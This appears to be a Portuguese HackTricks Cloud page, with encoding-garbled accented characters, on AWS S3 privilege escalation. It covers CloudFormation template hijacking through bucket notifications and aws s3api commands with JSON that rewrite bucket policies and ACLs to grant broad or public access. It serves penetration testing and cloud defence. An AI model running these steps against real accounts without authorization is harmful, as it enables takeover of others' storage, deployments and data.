# AWS - Escala√ß√£o de Privil√©gios no S3

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou se deseja acessar a **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no Github.

</details>

## S3

### `s3:PutBucketNotification`, `s3:PutObject`, `s3:GetObject`

Um invasor com essas permiss√µes em buckets interessantes pode ser capaz de sequestrar recursos e escalar privil√©gios.

Por exemplo, um invasor com essas **permiss√µes em um bucket de cloudformation** chamado "cf-templates-nohnwfax6a6i-us-east-1" ser√° capaz de sequestrar a implanta√ß√£o. O acesso pode ser concedido com a seguinte pol√≠tica:

```json
{
    "Version":"2012-10-17",
    "Statement":[
        {
            "Effect":"Allow",
            "Action":[
                "s3:PutBucketNotification",
                "s3:GetBucketNotification",
                "s3:PutObject",
                "s3:GetObject"],
            "Resource":[
                "arn:aws:s3:::cf-templates-*\/*",
                "arn:aws:s3:::cf-templates-*"]
        },
        {
            "Effect":"Allow",
            "Action":"s3:ListAllMyBuckets",
            "Resource":"*"
        }]
    }
```

E o sequestro √© poss√≠vel porque h√° uma **pequena janela de tempo desde o momento em que o modelo √© carregado** no bucket at√© o momento em que o **modelo √© implantado**. Um invasor pode simplesmente criar uma **fun√ß√£o lambda** em sua conta que ser√° **acionada quando uma notifica√ß√£o de bucket for enviada**, e **sequestra** o **conte√∫do** desse **bucket**.

![](<../../../.gitbook/assets/image (18) (1) (1).png>)

O m√≥dulo Pacu [`cfn__resouce_injection`](https://github.com/RhinoSecurityLabs/pacu/wiki/Module-Details#cfn\_\_resource\_injection) pode ser usado para automatizar esse ataque.\
Para mais informa√ß√µes, consulte a pesquisa original: [https://rhinosecuritylabs.com/aws/cloud-malware-cloudformation-injection/](https://rhinosecuritylabs.com/aws/cloud-malware-cloudformation-injection/)

### `s3:PutObject`, `s3:GetObject` <a href="#s3putobject-s3getobject" id="s3putobject-s3getobject"></a>

Essas s√£o as permiss√µes para **obter e fazer upload de objetos no S3**. V√°rios servi√ßos dentro da AWS (e fora dela) usam o armazenamento S3 para armazenar **arquivos de configura√ß√£o**.\
Um invasor com **acesso de leitura** a eles pode encontrar **informa√ß√µes sens√≠veis** neles.\
Um invasor com **acesso de grava√ß√£o** a eles pode **modificar os dados para abusar de algum servi√ßo e tentar escalar privil√©gios**.\
Estes s√£o alguns exemplos:

* Se uma inst√¢ncia EC2 estiver armazenando os **dados do usu√°rio em um bucket S3**, um invasor poderia modific√°-lo para **executar c√≥digo arbitr√°rio dentro da inst√¢ncia EC2**.

### `s3:PutBucketPolicy`

Um invasor, que precisa estar **na mesma conta**, sen√£o o erro `The specified method is not allowed will trigger`, com essa permiss√£o ser√° capaz de conceder a si mesmo mais permiss√µes sobre o(s) bucket(s), permitindo-lhe ler, escrever, modificar, excluir e expor buckets.

```bash
# Atualizar a pol√≠tica do bucket
aws s3api put-bucket-policy --policy file:///root/policy.json --bucket <bucket-name>
## Exemplo de pol√≠tica JSON
{
  "Id": "Policy1568185116930",
  "Version": "2012-10-17",
  "Statement": [
  {
      "Sid": "Stmt1568184932403",
      "Action": [
        "s3:ListBucket"
      ],
      "Effect": "Allow",
      "Resource": "arn:aws:s3:::welcome",
      "Principal": "*"
  },
  {
    "Sid": "Stmt1568185007451",
    "Action": [
      "s3:GetObject"
    ],
    "Effect": "Allow",
    "Resource": "arn:aws:s3:::welcome/*",
    "Principal": "*"
  }
  ]
}
```

### `s3:GetBucketAcl`, `s3:PutBucketAcl`

Um invasor pode abusar dessas permiss√µes para **conceder a si mesmo mais acesso** a buckets espec√≠ficos.\
Observe que o invasor n√£o precisa estar na mesma conta. Al√©m disso, o acesso de grava√ß√£o

```bash
# Atualizar o ACL do bucket
aws s3api get-bucket-acl --bucket <bucket-name>
aws s3api put-bucket-acl --bucket <bucket-name> --access-control-policy file://acl.json

## Exemplo de ACL JSON
## Certifique-se de modificar o displayName e o ID do propriet√°rio de acordo com o ACL do objeto que voc√™ recuperou.
{
  "Owner": {
    "DisplayName": "<DisplayName>",
    "ID": "<ID>"
  },
  "Grants": [
  {
    "Grantee": {
      "Type": "Group",
      "URI": "http://acs.amazonaws.com/groups/global/AuthenticatedUsers"
    },
  "Permission": "FULL_CONTROL"
  }
  ]
}
## Um ACL deve dar a permiss√£o WRITE_ACP para poder colocar um novo ACL
```

### `s3:GetObjectAcl`, `s3:PutObjectAcl`

Um invasor pode abusar dessas permiss√µes para conceder a si mesmo mais acesso a objetos espec√≠ficos dentro de buckets.

```bash
# Atualizar o ACL do objeto do bucket
aws s3api get-object-acl --bucket <bucekt-name> --key flag 
aws s3api put-object-acl --bucket <bucket-name> --key flag --access-control-policy file://objacl.json

## Exemplo de ACL JSON
## Certifique-se de modificar o displayName e o ID do propriet√°rio de acordo com o ACL do objeto que voc√™ recuperou.
{
  "Owner": {
    "DisplayName": "<DisplayName>",
    "ID": "<ID>"
  },
  "Grants": [
  {
    "Grantee": {
      "Type": "Group",
      "URI": "http://acs.amazonaws.com/groups/global/AuthenticatedUsers"
    },
  "Permission": "FULL_CONTROL"
  }
  ]
}
## Um ACL deve dar a permiss√£o WRITE_ACP para poder colocar um novo ACL
```

### `s3:GetObjectAcl`, `s3:PutObjectVersionAcl`

Um invasor com esses privil√©gios √© esperado para ser capaz de colocar um Acl em uma vers√£o espec√≠fica do objeto

```bash
aws s3api get-object-acl --bucket <bucekt-name> --key flag
aws s3api put-object-acl --bucket <bucket-name> --key flag --version-id <value> --access-control-policy file://objacl.json
```

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou se deseja acessar a **√∫ltima